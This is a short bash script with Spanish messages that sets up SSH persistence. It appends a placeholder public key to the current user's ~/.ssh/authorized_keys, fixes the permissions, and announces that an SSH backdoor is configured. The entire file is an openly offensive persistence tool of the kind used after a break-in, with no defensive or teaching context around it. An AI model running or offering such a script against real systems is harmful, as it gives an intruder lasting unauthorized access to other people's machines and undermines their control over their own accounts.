#!/bin/bash

MY_KEY="ssh-rsa AAAAB3Nza...tu_clave_publica... user@host"
AUTH_FILE="$HOME/.ssh/authorized_keys"

echo "[*] Configurando persistencia..."

if [ ! -d "$HOME/.ssh" ]; then
    mkdir -p "$HOME/.ssh"
    chmod 700 "$HOME/.ssh"
fi

# Añadir la clave solo si no existe ya
grep -q "$MY_KEY" "$AUTH_FILE" 2>/dev/null || echo "$MY_KEY" >> "$AUTH_FILE"

chmod 600 "$AUTH_FILE"
echo "[+] Puerta trasera SSH configurada."